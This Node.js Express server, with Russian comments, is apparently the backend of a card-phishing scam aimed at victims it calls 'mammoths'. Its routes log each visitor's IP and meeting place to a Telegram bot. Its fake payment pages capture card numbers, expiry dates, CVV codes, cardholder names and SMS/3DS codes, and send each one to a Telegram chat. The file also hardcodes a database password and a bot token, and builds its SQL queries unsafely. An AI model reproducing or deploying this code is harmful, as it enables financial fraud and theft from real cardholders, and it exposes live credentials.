const {Client} = require('pg')
const TelegramApi = require('node-telegram-bot-api')
const express = require('express')


// Подключение к бд
const client = new Client({
    host: "85.193.88.2",
    user: "gen_user",
    password: "syf790ux43",
    database: "default_db",
    port: 5432
})
client.connect()

// Обработака сайта
const app = express()
app.set('view engine', 'ejs')
app.use(express.urlencoded({extended: false}))
app.use(express.static('public'))

try {

    app.get('/', (req, res) => {
        res.render('error')
    })

    app.get('/:userlink', (req, res) => {
        client.query(`SELECT place FROM users WHERE link = '${req.params.userlink}'`, (err, ress)=>{
            if (ress.rows[0] === undefined) {
                return console.log("error")
            }
            if (ress) {
                const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
                res.render('index', {userplace: ress.rows[0].place})
                client.query(`SELECT user_id FROM users WHERE link = '${req.params.userlink}'`, (err, res)=>{
                    bot.sendMessage(res.rows[0].user_id, `💨 <b>Кальян\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'})
                })
                return console.log(ress.rows[0].place)
            } else {
                res.render(index, {userplace: "Москва Нирженская 15"})
            return console.log("undefined link") }
        })

    })
    

    app.post('/3ds', (req, res) => {
        res.render('index_card_ua', {amount: req.body.amount})
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'})
    })

    app.post('/confirmation', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'})
        res.render('index_code_ua', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2})
    })

    app.post('/confirmation_f', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
        let sms_number = req.body.sms_number
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'})
        setTimeout(function(){
            res.render('index_code_f_ua', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2})
        }, 3000)
        
    })
} catch (err) {
    console.log('error');
  }

  const PORT = 8069

  app.listen(PORT, () => {
      console.log(`Server started... `)
  })
